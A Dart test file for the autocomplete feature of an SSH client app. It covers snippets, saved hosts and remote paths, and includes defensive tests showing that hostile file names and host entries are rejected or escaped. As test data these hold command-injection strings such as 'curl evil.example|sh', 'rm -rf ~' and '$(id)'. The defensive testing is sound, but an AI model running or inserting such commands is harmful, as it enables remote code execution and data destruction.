import 'package:flutter_test/flutter_test.dart';
import 'package:zestssh/database/daos/connections_dao.dart';
import 'package:zestssh/database/database.dart';
import 'package:zestssh/features/command_history/autocomplete_sources.dart';

/// Inline autocomplete past history (3.2): snippets, saved hosts after `ssh`,
/// and paths on the host.
Snippet _snippet(String command) => Snippet(
      id: command,
      label: command,
      command: command,
      confirmBeforeRun: false,
      isDefault: false,
      sortOrder: 0,
      createdAt: DateTime(2026),
      updatedAt: DateTime(2026),
    );

ConnectionWithDetails _host(String host, {int port = 22, String? user, String protocol = 'ssh', DateTime? last}) =>
    ConnectionWithDetails(
      connection: Connection(
        id: host,
        label: host,
        host: host,
        port: port,
        keepAliveSeconds: 30,
        colorIndex: 0,
        protocol: protocol,
        zlibCompression: false,
        envVars: '',
        forwardAgent: false,
        compatibilityMode: false,
        sortOrder: 0,
        sizeTier: 1,
        pinned: false,
        monitored: false,
        lastConnected: last,
        createdAt: DateTime(2026),
        updatedAt: DateTime(2026),
      ),
      identity: user == null
          ? null
          : Identity(
              id: 'k-$user',
              label: user,
              username: user,
              authMethod: 'publicKey',
              usesAgent: false,
              colorIndex: 0,
              isDefault: false,
              allowUnattended: false,
              passwordAfterKey: false,
              createdAt: DateTime(2026),
              updatedAt: DateTime(2026),
            ),
    );

void main() {
  test('snippets: the shortest one that starts with what is typed; none that ask for values', () {
    final snippets = [
      _snippet('docker compose up -d'),
      _snippet('docker ps'),
      _snippet('docker logs {{container}}'),
      _snippet('df -h'),
    ];
    expect(completeFromSnippets('docker p', snippets), 'docker ps');
    expect(completeFromSnippets('docker c', snippets), 'docker compose up -d');
    expect(completeFromSnippets('docker l', snippets), isNull);
    expect(completeFromSnippets('docker ps', snippets), isNull, reason: 'nothing to add');
  });

  test('ssh: a saved host as the command reaches it, the last connected first', () {
    final hosts = [
      _host('192.168.10.21', user: 'alex', last: DateTime(2026, 10, 20)),
      _host('192.168.10.22', user: 'deploy', port: 2222, last: DateTime(2026, 10, 24)),
      _host('192.168.20.5', protocol: 'telnet'),
    ];
    expect(completeSshTarget('ssh a', hosts), 'ssh alex@192.168.10.21');
    expect(completeSshTarget('ssh 192.168.10', hosts), 'ssh 192.168.10.22 -p 2222');
    expect(completeSshTarget('ssh 192.168.20', hosts), isNull, reason: 'not an SSH host');
    expect(completeSshTarget('ls a', hosts), isNull);
    expect(completeSshTarget('ssh ', hosts), isNull);
  });

  test('paths: only / and ~/ ones, the folder to list and the name begun', () {
    expect(pathBeingTyped('cd /etc/ngi'), (folder: '/etc', start: 'ngi', at: 3));
    expect(pathBeingTyped('ls /va'), (folder: '/', start: 'va', at: 3));
    expect(pathBeingTyped('cat ~/.ss'), (folder: '.', start: '.ss', at: 4));
    expect(pathBeingTyped('vim ~/projects/ap'), (folder: 'projects', start: 'ap', at: 4));
    expect(pathBeingTyped('cd src/li'), isNull, reason: 'relative: the shell\'s folder is not known');
    expect(pathBeingTyped('cd /etc/ '), isNull);
  });

  test('paths: the one name that fits, a folder with its slash; what several share; hidden only after a dot', () {
    final etc = [('nginx', true), ('netplan', true), ('networks', false), ('.pwd.lock', false), ('hosts', false)];
    expect(completePath('cd /etc/ng', etc), 'cd /etc/nginx/');
    expect(completePath('cat /etc/ho', etc), 'cat /etc/hosts');
    expect(completePath('ls /etc/netw', etc), 'ls /etc/networks');
    expect(completePath('ls /etc/ne', etc), 'ls /etc/net', reason: 'netplan and networks share "net"');
    expect(completePath('ls /etc/net', etc), isNull, reason: 'nothing more they share');
    expect(completePath('ls /etc/n', etc), isNull, reason: 'nginx, netplan and networks share only "n"');
    expect(completePath('cat /etc/.p', etc), 'cat /etc/.pwd.lock');
    expect(completePath('cat /etc/p', etc), isNull, reason: 'hidden names wait for a dot');
  });

  // What these give is typed as keys when Right arrow takes it (found in a hostile server
  // review): a file's name is the server's to choose.
  group('a name made to run something', () {
    test('with a control character it is not offered: Right arrow alone would have run it', () {
      const padding = '                                                                                ';
      final name = 'readme.txt$padding;curl evil.example|sh;\x0f';
      expect(completePath('cat /tmp/rea', [(name, false)]), isNull);
      for (final ctl in ['\x0f', '\x03', '\x1b[201~', '\x15', '\x18\x05', '\n', '\r', '\t', '\x7f', '\u009b']) {
        expect(completePath('cat /tmp/rea', [('readme$ctl', false)]), isNull, reason: ctl);
      }
    });

    test('it takes no part in what the others share', () {
      expect(completePath('cat /tmp/re', const [('readme', false), ('rea\x0fdy', false)]), 'cat /tmp/readme');
    });

    test('what a shell would act on is a part of the name when Enter comes', () {
      expect(completePath('cat /tmp/rea', const [(r'readme$(id)`id`;id', false)]), r'cat /tmp/readme\$\(id\)\`id\`\;id');
      expect(completePath('cat /tmp/rea', const [('readme.txt      ;rm -rf ~;', false)]),
          r'cat /tmp/readme.txt\ \ \ \ \ \ \;rm\ -rf\ \~\;');
      expect(completePath('cat /tmp/a', const [('a|b&c>d<e', false)]), r'cat /tmp/a\|b\&c\>d\<e');
      expect(completePath('cat /tmp/a', const [(r"a'b" '"' r'c\d', false)]), r"cat /tmp/a\'b" r'\"c\\d');
      expect(completePath('cat /tmp/a', const [('a*?[x]{y}!#', false)]), r'cat /tmp/a\*\?\[x\]\{y\}\!\#');
    });

    test('a name with a space comes out as one word, folder or not', () {
      expect(completePath('cd /srv/my', const [('my files', true)]), r'cd /srv/my\ files/');
    });

    test('a plain name is as it was, in any script', () {
      expect(completePath('cat /srv/n', const [('notes-v1.2_final+x@y=z,w%.txt', false)]), 'cat /srv/notes-v1.2_final+x@y=z,w%.txt');
      expect(completePath('cat /srv/é', const [('été.txt', false)]), 'cat /srv/été.txt');
    });
  });

  test('a saved host a shell would read as more than a name is no target', () {
    for (final h in [
      _host('h;curl evil|sh'),
      _host(r'h$(id)'),
      _host('h`id`'),
      _host('h id'),
      _host('h\x0f'),
      _host('web', user: 'a;id'),
    ]) {
      expect(completeSshTarget('ssh ', [h]), isNull);
      expect(completeSshTarget('ssh h', [h]), isNull, reason: h.connection.host);
      expect(completeSshTarget('ssh a', [h]), isNull, reason: h.connection.host);
    }
    expect(completeSshTarget('ssh de', [_host('prod.example.com', user: 'deploy', port: 2222)]), 'ssh deploy@prod.example.com -p 2222');
    expect(completeSshTarget('ssh 2001', [_host('2001:db8::1')]), 'ssh 2001:db8::1');
    expect(completeSshTarget('ssh fe', [_host('fe80::1%eth0')]), 'ssh fe80::1%eth0');
  });
}
